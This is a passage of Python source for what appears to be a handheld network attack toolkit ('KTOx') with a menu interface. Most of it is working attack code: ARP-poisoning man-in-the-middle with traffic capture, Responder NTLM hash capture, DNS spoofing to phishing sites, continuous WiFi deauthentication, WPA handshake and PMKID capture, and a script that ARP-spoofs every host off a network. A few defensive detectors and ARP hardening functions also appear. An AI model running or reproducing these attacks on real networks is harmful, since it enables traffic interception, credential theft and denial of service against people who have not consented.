known={{h[1]:h[0] for h in hosts if len(h)>1 and h[1]}}
print(f'Baseline: {{len(known)}} MACs')
while True:
    time.sleep(30)
    cur=scan.scanNetwork('{net}')
    for h in cur:
        mac=h[1] if len(h)>1 else ''; ip=h[0]
        if mac and mac not in known:
            print(f'! ROGUE {{ip}} {{mac}}'); known[mac]=ip
"""
    ])


def do_llmnr_detect():
    _run_attack("LLMNR DETECT",[
        "python3","-c",
        "from scapy.all import sniff,UDP,DNS,IP\n"
        "def h(p):\n"
        "  if UDP in p and p[UDP].dport==5355:\n"
        "    if DNS in p:\n"
        "      src=p[IP].src if IP in p else '?'\n"
        "      if p[DNS].qr==1: print(f'! RESPONSE {src} possible poison')\n"
        "      else:\n"
        "        qn=p[DNS].qd.qname.decode(errors='ignore') if p[DNS].qd else '?'\n"
        "        print(f'~ QUERY {src} {qn}')\n"
        "sniff(filter='udp and port 5355',prn=h,store=0)"
    ])


def do_responder_on():
    iface = _get_interface_for_ip(ktox_state.get("gateway") or "1.1.1.1")
    rpy   = f"{INSTALL_PATH}Responder/Responder.py"
    if not os.path.exists(rpy):
        Dialog_info("Responder not\nfound.", wait=True)
        return
    subprocess.Popen(
        ["python3", rpy, "-Q", "-I", iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    Dialog_info(f"Responder ON\nIF: {iface}", wait=True)


def do_responder_off():
    subprocess.run(
        "kill -9 $(ps aux | grep Responder | grep -v grep | awk '{print $2}')",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    Dialog_info("Responder OFF", wait=True)


def do_arp_harden():
    hosts = ktox_state["hosts"]
    if not hosts:
        Dialog_info("No hosts.\nRun scan first.", wait=True)
        return
    if not YNDialog("ARP HARDEN", y="Yes", n="No",
                    b=f"Apply {len(hosts)}\nstatic entries?"):
        return
    applied = 0
    for h in hosts:
        ip  = h.get("ip",h[0]) if isinstance(h,dict) else h[0]
        mac = h.get("mac",h[1]) if isinstance(h,dict) else h[1] if len(h)>1 else ""
        if ip and mac and mac not in ("","N/A"):
            rc, _ = _run(["arp","-s",ip,mac])
            if rc == 0: applied += 1
    Dialog_info(f"✔ {applied} entries\nlocked.\nPoison blocked.", wait=True)


def do_baseline_export():
    Dialog_info("Exporting…", wait=False, timeout=1)
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = f"{LOOT_DIR}/baseline_{ts}.json"
    os.makedirs(LOOT_DIR, exist_ok=True)
    data = {
        "generated": ts,
        "interface": ktox_state["iface"],
        "gateway":   ktox_state["gateway"],
        "hosts": [
            h if isinstance(h,dict) else
            {"ip":h[0],"mac":h[1] if len(h)>1 else "",
             "vendor":h[2] if len(h)>2 else "",
             "hostname":h[3] if len(h)>3 else ""}
            for h in ktox_state["hosts"]
        ]
    }
    Path(path).write_text(json.dumps(data, indent=2))
    Dialog_info(f"✔ Saved:\nbaseline_{ts[:8]}\n{len(data['hosts'])} hosts", wait=True)


def do_dns_spoofing():
    sites = sorted([
        d for d in os.listdir(f"{INSTALL_PATH}DNSSpoof/sites")
        if os.path.isdir(f"{INSTALL_PATH}DNSSpoof/sites/{d}")
    ]) if os.path.exists(f"{INSTALL_PATH}DNSSpoof/sites") else []
    if not sites:
        Dialog_info("No phishing sites\nfound.", wait=True)
        return
    items = [f" {s}" for s in sites]
    sel   = GetMenu(items)
    if not sel: return
    site  = sel.strip()
    if not YNDialog("DNS SPOOF", y="Yes", n="No", b=f"Spoof {site}?"):
        return
    webroot = f"{INSTALL_PATH}DNSSpoof/sites/{site}"
    subprocess.Popen(
        f"cd {webroot} && php -S 0.0.0.0:80",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    Dialog_info(f"DNS Spoof ON\n{site}", wait=True)


def do_dns_spoof_stop():
    subprocess.run("pkill -f 'php'", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run("pkill -f 'ettercap'", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    Dialog_info("DNS Spoof\nstopped.", wait=True)

def do_start_mitm_suite():
    """Full on-device MITM: pick host, ARP poison both ways, tcpdump capture."""
    tgt = _pick_host()
    if not tgt:
        return
    iface = _get_interface_for_ip(tgt)
    gw    = ktox_state["gateway"]
    if not gw:
        Dialog_info("No gateway!\nRun scan first.", wait=True)
        return
    if not YNDialog("FULL MITM", y="Yes", n="No", b=f"{tgt}\nAll traffic?"):
        return
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    subprocess.run(["pkill", "-9", "arpspoof"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(["arpspoof", "-i", iface, "-t", tgt, gw],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(["arpspoof", "-i", iface, "-t", gw, tgt],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    pcap = f"{LOOT_DIR}/mitm_{ts}.pcap"
    os.makedirs(LOOT_DIR, exist_ok=True)
    subprocess.Popen(["tcpdump", "-i", iface, "-w", pcap, "-q"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ktox_state["running"] = "MITM SUITE"
    Dialog_info(f"MITM ACTIVE\n{tgt}\nCapturing...\nKEY3=stop", wait=True)
    subprocess.run(["pkill", "-9", "arpspoof"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["pkill", "-9", "tcpdump"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    ktox_state["running"] = None
    Dialog_info(f"MITM stopped.\nPCAP: {os.path.basename(pcap)}", wait=True)


def do_deauth_targeted():
    """Scan APs, pick one, run continuous deauth until KEY3."""
    mon = _require_monitor_iface()
    if not mon:
        return
    Dialog_info("Scanning APs\n10 seconds...", wait=False, timeout=1)
    import glob, csv
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    tmp = f"/tmp/ktox_scan_{ts}"
    os.makedirs(tmp, exist_ok=True)
    proc = subprocess.Popen(
        ["airodump-ng", "--write", f"{tmp}/s", "--output-format", "csv",
         "--write-interval", "5", mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(10)
    proc.terminate()
    aps = []
    for cp in glob.glob(f"{tmp}/s*.csv"):
        try:
            for row in csv.reader(open(cp, errors="ignore")):
                if len(row) < 14: continue
                bssid=row[0].strip(); ch=row[3].strip(); essid=row[13].strip()
                if bssid and ":" in bssid and bssid!="BSSID" and ch.isdigit():
                    aps.append((bssid, ch, essid[:14] or "hidden"))
        except Exception: pass
    if not aps:
        Dialog_info("No APs found.\nTry again.", wait=True)
        return
    items = [f" {e}  ch{c}" for b,c,e in aps]
    sel   = GetMenu(items)
    if not sel: return
    bssid, ch, essid = aps[items.index(sel)]
    if not YNDialog("DEAUTH", y="Yes", n="No", b=f"{essid}\nch{ch}?"):
        return
    subprocess.run(["pkill", "-9", "aireplay-ng"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    proc2 = subprocess.Popen(
        ["aireplay-ng", "--deauth", "0", "-a", bssid, mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ktox_state["running"] = "DEAUTH"
    Dialog_info(f"DEAUTH active\n{essid}\nch{ch}\nKEY3=stop", wait=True)
    proc2.terminate()
    subprocess.run(["pkill", "-9", "aireplay-ng"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ktox_state["running"] = None
    Dialog_info("Deauth stopped.", wait=False, timeout=1)


def do_handshake_targeted():
    """Scan APs, pick one, capture WPA handshake via forced deauth."""
    mon = _require_monitor_iface()
    if not mon:
        return
    Dialog_info("Scanning APs\n10 seconds...", wait=False, timeout=1)
    import glob, csv
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    tmp = f"/tmp/ktox_hs_{ts}"
    os.makedirs(tmp, exist_ok=True)
    proc = subprocess.Popen(
        ["airodump-ng", "--write", f"{tmp}/s", "--output-format", "csv",
         "--write-interval", "5", mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(10)
    proc.terminate()
    aps = []
    for cp in glob.glob(f"{tmp}/s*.csv"):
        try:
            for row in csv.reader(open(cp, errors="ignore")):
                if len(row) < 14: continue
                bssid=row[0].strip(); ch=row[3].strip(); essid=row[13].strip()
                if bssid and ":" in bssid and bssid!="BSSID" and ch.isdigit():
                    aps.append((bssid, ch, essid[:14] or "hidden"))
        except Exception: pass
    if not aps:
        Dialog_info("No APs found.", wait=True)
        return
    items = [f" {e}  ch{c}" for b,c,e in aps]
    sel   = GetMenu(items)
    if not sel: return
    bssid, ch, essid = aps[items.index(sel)]
    if not YNDialog("HANDSHAKE", y="Yes", n="No", b=f"{essid}\nch{ch}?"):
        return
    out_ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    outdir  = f"{LOOT_DIR}/handshakes"
    os.makedirs(outdir, exist_ok=True)
    outpath = f"{outdir}/hs_{essid.replace(' ','_')}_{out_ts}"
    cap = subprocess.Popen(
        ["airodump-ng", "-c", ch, "--bssid", bssid, "-w", outpath, mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    subprocess.run(["aireplay-ng", "--deauth", "4", "-a", bssid, mon],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    Dialog_info(f"Capturing HS\n{essid}\nKEY3=stop\n~30 sec", wait=True)
    cap.terminate()
    subprocess.run(["pkill", "-9", "airodump-ng"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    Dialog_info(f"Saved:\nhs_{essid[:14]}\nUse aircrack-ng", wait=True)


def do_wifi_handshake_engine():
    """Enhanced WiFi handshake capture using Scapy engine."""
    try:
        from payloads.wifi.wifi_handshake_engine import get_wifi_engine
    except ImportError:
        Dialog_info("Engine load\nFAILED", wait=True)
        return

    engine = get_wifi_engine()

    if not engine.is_scapy_available():
        Dialog_info("Scapy not\ninstalled", wait=True)
        return

    iface = ktox_state.get("wifi_iface", "wlan0")

    # Enable monitor mode
    Dialog_info(f"Monitor mode\non {iface}…", wait=False, timeout=1)
    if not engine.enable_monitor_mode(iface):
        Dialog_info("Monitor FAILED\nCheck adapter", wait=True)
        return

    # Scan networks
    Dialog_info("Scanning…\nPlease wait", wait=False, timeout=1)
    if not engine.scan_networks(timeout=15):
        Dialog_info("Scan failed\nor no nets", wait=True)
        engine.disable_monitor_mode()
        return

    networks = engine.get_networks_list()
    items = [f" {e[:20]:20} {b} ch{c}" for b, e, c, s in networks]
    sel = GetMenu(items)
    if not sel:
        engine.disable_monitor_mode()
        return

    bssid, essid, ch, sig = networks[items.index(sel)]

    if not YNDialog("Capture HS?", y="Capture", n="Cancel", b=f"{essid}\nch{ch}"):
        engine.disable_monitor_mode()
        return

    # Capture handshake with timeout
    Dialog_info(f"Capturing…\n{essid}\nKEY3=stop", wait=True)
    if engine.capture_handshake(bssid, essid, ch, timeout=30, deauth_count=5):
        Dialog_info("HS captured!\nSaved to loot", wait=True)
    else:
        Dialog_info("No handshake\ncaptured", wait=True)

    engine.disable_monitor_mode()


def do_wifi_pmkid_attack():
    """Capture PMKID from network without clients."""
    try:
        from payloads.wifi.wifi_handshake_engine import get_wifi_engine
    except ImportError:
        Dialog_info("Engine load\nFAILED", wait=True)
        return

    engine = get_wifi_engine()
    iface = ktox_state.get("wifi_iface", "wlan0")

    # Enable monitor mode
    Dialog_info(f"Monitor mode\non {iface}…", wait=False, timeout=1)
    if not engine.enable_monitor_mode(iface):
        Dialog_info("Monitor FAILED", wait=True)
        return

    # Scan networks
    Dialog_info("Scanning…", wait=False, timeout=1)
    if not engine.scan_networks(timeout=15):
        Dialog_info("Scan failed", wait=True)
        engine.disable_monitor_mode()
        return

    networks = engine.get_networks_list()
    items = [f" {e[:20]:20} {b} ch{c}" for b, e, c, s in networks]
    sel = GetMenu(items)
    if not sel:
        engine.disable_monitor_mode()
        return

    bssid, essid, ch, sig = networks[items.index(sel)]

    if not YNDialog("PMKID?", y="Attack", n="Cancel", b=essid):
        engine.disable_monitor_mode()
        return

    Dialog_info(f"PMKID attack\n{essid}\nKEY3=stop", wait=True)
    engine.pmkid_attack(bssid, essid, ch, timeout=10)

    engine.disable_monitor_mode()
    Dialog_info("PMKID attack\nCompleted", wait=True)


# ═══════════════════════════════════════════════════════════════════════════════
# ── Payload directory scanner ──────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

PAYLOAD_CATEGORIES = [
    ("offensive",     "Offensive"),
    ("recon",         "Recon"),
    ("intercept",     "Intercept"),
    ("dos",           "DoS"),
    ("wifi",          "WiFi"),
    ("bluetooth",     "Bluetooth"),
    ("network",       "Network"),
    ("creds",         "Credentials"),
    ("evasion",       "Evasion"),
    ("hardware",      "Hardware"),
    ("usb",           "USB"),
    ("social",        "Social Eng"),
    ("exfil",         "Exfiltrate"),
    ("remote",        "Remote"),
    ("evil",          "Evil Portal"),
    ("media",         "Media"),
    ("testing",       "Testing"),
    ("utilities",     "Utilities"),
    ("games",         "Games"),
    ("general",       "General"),
    ("examples",      "Examples"),
]


# ── FontAwesome 5 Solid icon map (Unicode Private-Use codepoints) ─────────────
# These map menu label text → FA glyph so every item gets an icon like RaspyJack.

_FA_ICONS: dict = {
    # ── Home menu ─────────────────────────────────────────────────────────
    "Network":          "\uf6ff",   # fa-network-wired
    "Offensive":        "\uf54c",   # fa-skull
    "WiFi Engine":      "\uf1eb",   # fa-wifi
    "MITM & Spoof":     "\uf0ec",   # fa-exchange
    "Navarro Recon":    "\uf002",   # fa-search
    "DNSSpoof":         "\uf0ac",   # fa-globe
    "Responder":        "\uf382",   # fa-satellite-dish
    "Purple Team":      "\uf3ed",   # fa-shield-alt
    "Payloads":         "\uf0e7",   # fa-bolt
    "Loot":             "\uf07c",   # fa-folder-open
    "Stealth":          "\uf070",   # fa-eye-slash
    "System":           "\uf013",   # fa-cog
    "KTOx_Pi":          "\uf2db",   # fa-microchip
    # ── Payload categories ────────────────────────────────────────────────
    "Recon":            "\uf002",   # fa-search
    "Intercept":        "\uf0ec",   # fa-exchange
    "DoS":              "\uf0e7",   # fa-bolt
    "WiFi":             "\uf1eb",   # fa-wifi
    "Bluetooth":        "\uf294",   # fa-bluetooth-b
    "Credentials":      "\uf084",   # fa-key
    "Evasion":          "\uf070",   # fa-eye-slash
    "Hardware":         "\uf2db",   # fa-microchip
    "USB":              "\uf287",   # fa-usb
    "Social Eng":       "\uf007",   # fa-user
    "Exfiltrate":       "\uf019",   # fa-download
    "Remote":           "\uf233",   # fa-server
    "Evil Portal":      "\uf0ac",   # fa-globe
    "Media":            "\uf03e",   # fa-image
    "Testing":          "\uf0c3",   # fa-flask
    "Utilities":        "\uf0ad",   # fa-wrench
    "Games":            "\uf11b",   # fa-gamepad
    "General":          "\uf013",   # fa-cog
    "Examples":         "\uf121",   # fa-code
    # ── Network submenu ───────────────────────────────────────────────────
    "Scan Network":     "\uf002",
    "Username Recon":   "\uf002",   # fa-search
    "Navarro Status":   "\uf129",   # fa-info
    "Scan Ports":       "\uf569",   # fa-ethernet
    "Reports":          "\uf15c",   # fa-file-alt
    "Show Hosts":       "\uf0c0",   # fa-users
    "Ping Gateway":     "\uf492",   # fa-satellite
    "Network Info":     "\uf129",   # fa-info
    "ARP Watch":        "\uf06e",   # fa-eye
    # ── Offensive submenu ─────────────────────────────────────────────────
    "Loki Engine":      "\uf0e7",   # fa-bolt
    "Kick ONE off":     "\uf05e",   # fa-ban
    "Kick ALL off":     "\uf1f8",   # fa-trash
    "ARP MITM":         "\uf0ec",
    "ARP Flood":        "\uf0e7",
    "Gateway DoS":      "\uf54c",
    "ARP Cage":         "\uf023",   # fa-lock
    "NTLMv2 Capture":   "\uf084",
    # ── WiFi submenu ──────────────────────────────────────────────────────
    "Enable Monitor":   "\uf0e7",
    "Disable Monitor":  "\uf070",
    "WiFi Scan":        "\uf002",
    "Deauth AP":        "\uf1d8",   # fa-paper-plane
    "Handshake Cap":    "\uf0a3",   # fa-certificate
    "HS Engine Pro":    "\uf085",   # fa-cogs
    "PMKID Attack":     "\uf084",
    "Evil Twin AP":     "\uf1eb",
    "Select Adapter":   "\uf233",
    # ── MITM submenu ──────────────────────────────────────────────────────
    "Start MITM Suite": "\uf0ec",
    "DNS Spoofing ON":  "\uf0ac",
    "DNS Spoofing OFF": "\uf070",
    "Start Spoof":      "\uf0ac",   # fa-globe
    "Stop Spoof":       "\uf070",   # fa-eye-slash
    "Rogue DHCP/WPAD":  "\uf233",
    "Silent Bridge":    "\uf6ff",
    # ── Responder submenu ─────────────────────────────────────────────────
    "Responder ON":     "\uf382",
    "Responder OFF":    "\uf070",
    "Responder Logs":   "\uf15c",   # fa-file-alt
    "Read Hashes":      "\uf1c0",   # fa-database
    # ── Purple Team submenu ───────────────────────────────────────────────
    "ARP Hardening":    "\uf3ed",
    "Disable LLMNR":    "\uf070",
    "SMB Signing":      "\uf023",
    "Encrypted DNS":    "\uf0ac",
    "Cleartext Audit":  "\uf002",
    "Export Baseline":  "\uf019",
    "Verify Baseline":  "\uf00c",   # fa-check
    "Defense Report":   "\uf15c",
    "ARP Diff Live":    "\uf0ec",   # fa-exchange
    "ARP Harden":       "\uf3ed",   # fa-shield-alt
    "Rogue Detector":   "\uf06e",   # fa-eye
    "LLMNR Detector":   "\uf002",   # fa-search
    "SMB Probe":        "\uf233",   # fa-server
    "Baseline Export":  "\uf019",   # fa-download
    # ── System submenu ────────────────────────────────────────────────────
    "WebUI Status":     "\uf0e0",   # fa-envelope
    "Refresh State":    "\uf021",   # fa-sync
    "System Info":      "\uf129",
    "Network Mgr":      "\uf6ff",   # fa-network-wired
    "Bluetooth Mgr":    "\uf294",   # fa-bluetooth-b
    "UI Theme":         "\uf53f",   # fa-palette
    "Theme Presets":    "\uf53f",   # fa-palette
    "User Themes":      "\uf0c0",   # fa-users
    "Custom Colors":    "\uf576",   # fa-paint-brush
    "Save as User Theme": "\uf0c7", # fa-save
    "View Mode":        "\uf03a",   # fa-th
    "Wallpaper":        "\uf03e",   # fa-image
    "Return to Default": "\uf01e",  # fa-reply
    "Discord Status":   "\uf392",   # fa-discord
    "Discord Webhook":  "\uf392",   # fa-discord
    "Lock":             "\uf023",   # fa-lock
    "OTA Update":       "\uf021",   # fa-sync
    "No Wallpaper":     "\uf070",   # fa-eye-slash
    "Save & Apply":     "\uf0c7",   # fa-save
    "Reboot":           "\uf2f9",   # fa-redo
    "Shutdown":         "\uf011",   # fa-power-off
    # ── Payload categories (continued) ────────────────────────────────────
    "List":             "\uf03a",   # fa-list
    "Grid":             "\uf00a",   # fa-th
    "Carousel":         "\uf362",   # fa-exchange-alt
    "Panel":            "\uf2d0",   # fa-window-maximize
    "Table":            "\uf0ce",   # fa-table
    "Paged":            "\uf15b",   # fa-file
    "Thumbnail":        "\uf03e",   # fa-image
    "V-Carousel":       "\uf338",   # fa-arrows-alt-v
    # ── Universal ─────────────────────────────────────────────────────────
    "Back":             "\uf060",   # fa-arrow-left
    "Home":             "\uf015",   # fa-home
}


def _icon_for(label: str) -> str:
    """Return the FontAwesome glyph for *label*, or '' when unknown / no font."""
    if not icon_font:
        return ""
    bare = label.strip()
    bare = bare.lstrip("✔*+-•> ")
    if bare.startswith("[") and "]" in bare:
        bare = bare.split("]", 1)[1].strip()
    if bare in _FA_ICONS:
        return _FA_ICONS[bare]
    # Strip trailing payload count like " Games (13)" → "Games"
    if " (" in bare:
        key = bare[: bare.index(" (")]
        if key in _FA_ICONS:
            return _FA_ICONS[key]
    return ""


def _list_payloads(category):
    cat_dir = Path(default.payload_path) / category
    if not cat_dir.exists(): return []
    result = []
    for f in sorted(cat_dir.glob("*.py")):
        if f.name.startswith("_"): continue
        name = f.stem.replace("_"," ").title()
        try:
            for line in f.read_text(errors="ignore").splitlines()[:10]:
                if line.startswith("# NAME:"): name = line[7:].strip()
        except Exception:
            pass
        result.append((name, str(f)))
    return result

# ═══════════════════════════════════════════════════════════════════════════════
# ── Menu class ─────────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

class KTOxMenu:
    which  = "home"
    select = 0

    def _menu(self):
        return {
        # ── HOME ──────────────────────────────────────────────────────────────
        "home": (
            (" Network",       "net"),
            (" Offensive",     "off"),
            (" WiFi Engine",   "wifi"),
            (" MITM & Spoof",  "mitm"),
            (" Navarro Recon", "nav"),
            (" DNSSpoof",      "dns"),
            (" Responder",     "resp"),
            (" Purple Team",   "purple"),
            (" Payloads",      "pay"),
            (" Loot",          "loot"),
            (" Stealth",       enter_stealth),
            (" System",        "sys"),
        ),

        # ── NETWORK ───────────────────────────────────────────────────────────
        "net": (
            (" Scan Network",    do_network_scan),
            (" Show Hosts",      self._show_hosts),
            (" Ping Gateway",    self._ping_gw),
            (" Network Info",    self._net_info),
            (" ARP Watch",       do_arp_watch),
            (" Back",            "home"),
        ),

        # ── OFFENSIVE ─────────────────────────────────────────────────────────
        "off": (
            (" Loki Engine",     self._loki_engine),
            (" Kick ONE off",    self._kick_one),
            (" Kick ALL off",    self._kick_all),
            (" ARP MITM",        self._do_mitm),
            (" ARP Flood",       self._arp_flood),
            (" Gateway DoS",     self._gw_dos),
            (" ARP Cage",        self._arp_cage),
            (" NTLMv2 Capture",  self._ntlm),
            (" Back",            "home"),
        ),

        # ── WiFi ENGINE ───────────────────────────────────────────────────────
        "wifi": (
            (" Enable Monitor",  do_wifi_monitor_on),
            (" Disable Monitor", do_wifi_monitor_off),
            (" WiFi Scan",       do_wifi_scan),
            (" Deauth AP",       do_deauth_targeted),
            (" Handshake Cap",   do_handshake_targeted),
            (" HS Engine Pro",   do_wifi_handshake_engine),
            (" PMKID Attack",    do_wifi_pmkid_attack),
            (" Evil Twin AP",    self._evil_twin),
            (" Select Adapter",  self._select_adapter),
        ),

        # ── MITM & SPOOF ──────────────────────────────────────────────────────
        "mitm": (
            (" Start MITM Suite",   do_start_mitm_suite),
            (" DNS Spoofing ON",    do_dns_spoofing),
            (" DNS Spoofing OFF",   do_dns_spoof_stop),
            (" Rogue DHCP/WPAD",    partial(exec_payload,"intercept/rogue_dhcp_wpad")),
            (" Silent Bridge",      partial(exec_payload,"intercept/silent_bridge")),
            (" Evil Portal",        partial(exec_payload,"recon/honeypot")),
        ),

        # ── NAVARRO RECON ────────────────────────────────────────────────────
        "nav": (
            (" Username Recon", self._nav_scan),
            (" Navarro Status", self._nav_status),
            (" Reports",        self._nav_reports),
            (" Back",           "home"),
        ),

        # ── DNSSPOOF ─────────────────────────────────────────────────────────
        "dns": (
            (" Start Spoof",    do_dns_spoofing),
            (" Stop Spoof",     do_dns_spoof_stop),
            (" Back",           "home"),
        ),

        # ── RESPONDER ─────────────────────────────────────────────────────────
        "resp": (
            (" Responder ON",     do_responder_on),
            (" Responder OFF",    do_responder_off),
            (" Read Hashes",      self._read_responder_logs),
        ),

        # ── PURPLE TEAM ───────────────────────────────────────────────────────
        "purple": (
            (" ARP Watch",        do_arp_watch),
            (" ARP Diff Live",    do_arp_diff),
            (" Rogue Detector",   do_rogue_detect),
            (" LLMNR Detector",   do_llmnr_detect),
            (" ARP Harden",       do_arp_harden),
            (" Baseline Export",  do_baseline_export),
            (" Verify Baseline",  self._verify_baseline),
            (" SMB Probe",        partial(exec_payload,"recon/smb_probe")),
        ),

        # ── PAYLOADS ──────────────────────────────────────────────────────────
        "pay":    self._build_payload_menu(),

        # ── LOOT — special ────────────────────────────────────────────────────
        "loot":   None,

        # ── SYSTEM ────────────────────────────────────────────────────────────
        "sys": (
            (" WebUI Status",    self._webui_status),
            (" Refresh State",   self._refresh),
            (" System Info",     self._sysinfo),
            (" Network Mgr",     self._network_manager),
            (" Bluetooth Mgr",   self._bluetooth_manager),
            (" UI Theme",        self._ui_theme_menu),
            (" OTA Update",      partial(exec_payload,"general/auto_update")),
            (" Discord Webhook", self._discord_status),
            (" Lock",            OpenLockMenu),
            (" Reboot",          self._reboot),
            (" Shutdown",        self._shutdown),
        ),
        }

    # ── Rendering ─────────────────────────────────────────────────────────────

    def GetMenuList(self):
        tree  = self._menu()
        items = tree.get(self.which, ())
        if items is None: return []
        return [item[0] for item in items]

    def render_current(self):
        RenderMenuWindowOnce(self.GetMenuList(), self.select)

    # ── Navigation ────────────────────────────────────────────────────────────

    # ── Network actions ───────────────────────────────────────────────────────

    def _show_hosts(self):
        hosts = ktox_state["hosts"]
        if not hosts:
            Dialog_info("No hosts.\nRun scan first.", wait=True)
            return

        # Build display lines
        lines = []
        for h in hosts:
            ip  = h.get("ip",  "?") if isinstance(h, dict) else (h[0] if len(h) > 0 else "?")
            mac = h.get("mac", "")   if isinstance(h, dict) else (h[1] if len(h) > 1 else "")
            lines.append(f"{ip}  {mac[:8]}".strip())
        if not lines:
            Dialog_info("No hosts found.", wait=True)
            return

        WINDOW = 6
        total  = len(lines)
        sel    = 0

        while True:
            offset = max(0, min(sel-2, total-WINDOW))
            window = lines[offset:offset+WINDOW]

            with draw_lock:
                _draw_toolbar()
                draw.rectangle([0,12,128,128], fill=color.background)
                color.DrawBorder()
                # Title
                draw.rectangle([3,13,125,24], fill=color.title_bg)
                _centered(f"Hosts ({total})", 13, font=small_font, fill=color.border)
                draw.line([3,24,125,24], fill=color.border, width=1)
                # Rows
                for i, txt in enumerate(window):
                    row_y = 26 + 13*i
                    is_sel = (i == sel-offset)
                    if is_sel:
                        draw.rectangle([3, row_y, 124, row_y+12], fill=color.select)
                    draw.text((5, row_y+1), txt[:22], font=small_font,
                              fill=color.selected_text if is_sel else color.text)
                # Footer hint
                draw.line([3,112,125,112], fill="#2a0505", width=1)
                _centered("LEFT=back  CTR=exit", 114, font=small_font, fill="#4a2020")

            time.sleep(0.08)
            btn = getButton(timeout=0.5)
            if   btn is None:                                  continue
            elif btn == "KEY_DOWN_PIN":                        sel = (sel+1) % total
            elif btn == "KEY_UP_PIN":                         sel = (sel-1) % total
            elif btn in ("KEY_LEFT_PIN","KEY1_PIN","KEY2_PIN",
                         "KEY3_PIN","KEY_PRESS_PIN",
                         "KEY_RIGHT_PIN"):                     return

    def _ping_gw(self):
        gw = ktox_state["gateway"]
        if not gw:
            Dialog_info("No gateway!", wait=True)
            return
        rc, out = _run(["ping","-c","4","-W","1",gw], timeout=10)
        lines = [f" GW: {gw}"] + [f" {l}" for l in out.splitlines()[-4:]]
        GetMenu(lines)

    def _net_info(self):
        ip  = get_ip()
        gw  = ktox_state["gateway"]
        ifc = ktox_state["iface"]
        GetMenu([
            f" IP:    {ip}",
            f" GW:    {gw}",
            f" IF:    {ifc}",
            f" WiFi:  {ktox_state['wifi_iface']}",
            f" Mon:   {ktox_state.get('mon_iface','off')}",
            f" Hosts: {len(ktox_state['hosts'])}",
            f" Loot:  {loot_count()} files",
        ])

    # ── Offensive actions ──────────────────────────────────────────────────────

    def _kick_one(self):
        tgt = _pick_host()
        if not tgt:
            return
        pps = _ask_pps()
        if pps is None:
            return
        if YNDialog("KICK ONE", y="Yes", n="No", b=f"Kick {tgt}\n@ {pps} pkt/s?"):
            do_arp_kick(tgt, pps)

    def _kick_all(self):
        """Kick every non-gateway host discovered in the last scan."""
        gw     = ktox_state["gateway"]
        iface  = ktox_state["iface"]
        if not gw:
            Dialog_info("No gateway!\nRun scan first.", wait=True)
            return
        hosts  = [h["ip"] for h in ktox_state.get("hosts", [])
                  if h["ip"] != gw]
        if not hosts:
            Dialog_info("No hosts found.\nRun scan first.", wait=True)
            return
        pps = _ask_pps()
        if pps is None:
            return
        if not YNDialog("KICK ALL", y="Yes", n="No",
                        b=f"Kick {len(hosts)} hosts\n@ {pps} pkt/s?"):
            return

        Dialog_info("Resolving MACs…", wait=False, timeout=1)
        targets = [(ip, _scapy_resolve(ip, iface)) for ip in hosts]
        targets = [(ip, mac) for ip, mac in targets if mac]
        if not targets:
            Dialog_info("No MACs resolved.\nHosts offline?", wait=True)
            return

        gw_mac   = _scapy_resolve(gw, iface)
        interval = 1.0 / max(1, pps)
        t_list   = ";".join(f"('{ip}','{mac}')" for ip, mac in targets)

        script = (
            "import sys,time,logging,signal;"
            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
            "from scapy.all import Ether,ARP,sendp,get_if_hwaddr;"
            "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
            f"iface='{iface}';"
            f"my=get_if_hwaddr(iface);"
            f"g_ip='{gw}';g_mac='{gw_mac}';"
            f"iv={interval!r};"
            f"targets=[{t_list}];"
            "while True:"
            "  for t_ip,t_mac in targets:"
            "    sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
            "    g_mac and sendp(Ether(src=my,dst=g_mac)/ARP(op=2,hwsrc=my,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
            "    time.sleep(iv)"
        )
        proc = subprocess.Popen(["python3", "-c", script],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ktox_state["running"] = f"KICK ALL {pps}/s"
        Dialog_info(f"KICK ALL\n{len(targets)} hosts\n{pps} pkt/s\nKEY3=stop", wait=True)
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except Exception:
            proc.kill()
        ktox_state["running"] = None
        if gw_mac:
            for t_ip, t_mac in targets:
                _scapy_restore(t_ip, t_mac, gw, gw_mac, iface, "")
        Dialog_info("Kick ALL stopped.\nARP restored.", wait=False, timeout=1)

    def _do_mitm(self):
